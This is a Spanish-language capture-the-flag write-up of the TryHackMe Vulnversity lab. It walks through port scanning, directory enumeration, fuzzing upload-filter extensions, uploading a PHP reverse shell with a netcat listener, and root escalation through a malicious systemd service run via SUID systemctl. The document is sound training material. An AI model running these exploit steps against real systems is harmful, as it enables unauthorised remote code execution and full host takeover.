# Bitácora — Sala 3: Vulnversity

- **Plataforma:** TryHackMe — https://tryhackme.com/room/vulnversity
- **Tipo:** Máquina (explotación web + escalada SUID). Requiere VPN.
- **IP objetivo:** 10.65.166.166 — asignada por THM.
- **SO objetivo:** Ubuntu 20.04 (kernel 5.15.0-139).
- **Resultado:** Compromiso total — acceso **root** obtenido.
- **Fecha:** 2026-10-07
- **Metodología:** PTES + OWASP WSTG (enfoque black box).

> ⚠️ Flags redactadas; sus hashes SHA-256 están en el informe → Anexo C.

## Kill chain (cadena de ataque)

### Fase 1 — Escaneo
```bash
nmap -sC -sV -p- --min-rate 5000 -oN bitacora/nmap_vulnversity.txt <IP>
```
6 puertos: 21 (vsftpd 3.0.5), 22 (OpenSSH 8.2p1), 139/445 (Samba 4),
3128 (Squid 4.10), **3333 (Apache 2.4.41 — "Vuln University", el servidor web)**.
Nota: el web está en puerto no estándar (3333) → requirió escaneo completo `-p-`.

### Fase 2 — Enumeración web
```bash
gobuster dir -u http://<IP>:3333 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o bitacora/gobuster_vulnversity.txt
```
Descubierto `/internal/` → formulario de subida de archivos sin autenticación.

### Fase 3 — Explotación (carga insegura de archivos → RCE)
```bash
# Fuzzing de extensiones contra el filtro (lista negra incompleta)
for ext in jpg php php3 php4 php5 phtml phps pht phar
    curl -s -F "file=@/tmp/t;filename=t.$ext" -F "submit=Submit" http://<IP>:3333/internal/index.php
end
# → solo .phtml es aceptada Y ejecutada como PHP
```
Reverse shell (pentestmonkey, de seclists) configurada con IP/puerto del atacante,
subida como `.phtml` y disparada:
```bash
cp /usr/share/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php /tmp/shell.phtml
# editar $ip y $port
curl -s -F "file=@/tmp/shell.phtml;filename=shell.phtml" -F "submit=Submit" http://<IP>:3333/internal/index.php
nc -lvnp 4444                                   # listener
curl -s http://<IP>:3333/internal/uploads/shell.phtml   # trigger
# → shell como www-data (RCE)
```
Flag de usuario: `cat /home/*/user.txt` → [REDACTED → Anexo C].

### Fase 4 — Escalada de privilegios (SUID systemctl → root)
```bash
find / -perm -u=s -type f 2>/dev/null     # → /bin/systemctl tiene SUID (anómalo)
# Técnica GTFOBins: servicio malicioso ejecutado como root vía SUID systemctl
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/proof.txt; cat /root/root.txt >> /tmp/proof.txt; chmod 644 /tmp/proof.txt"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
cat /tmp/proof.txt     # → uid=0(root) + flag de root → COMPROMISO TOTAL
```
Flag de root: [REDACTED → Anexo C].

## Hallazgos derivados (para el informe)
| ID | Hallazgo | Fase | Severidad |
|----|----------|------|-----------|
| H-08 | Servicio web en puerto no estándar sin endurecer (Apache 2.4.41) | Escaneo | Baja |
| H-09 | Directorio interno sin autenticación (`/internal/`) con formulario de subida | Enumeración | Media |
| H-10 | Filtro de subida por lista negra incompleta → permite `.phtml` ejecutable | Explotación | Crítica |
| H-11 | Ejecución remota de código (RCE) vía reverse shell PHP | Explotación | Crítica |
| H-12 | Binario `/bin/systemctl` con bit SUID → escalada a root | Post-explotación | Crítica |

## Gotchas de entorno (CachyOS/Arch) resueltos
- Reverse shell no conectaba de vuelta → **UFW** (firewall) bloqueaba la entrada.
  Solución: `sudo ufw allow in on tun0` (permitir entrada por la interfaz VPN).
- La reverse shell `php-reverse-shell` estaba en `seclists`, no en la ruta de Kali.
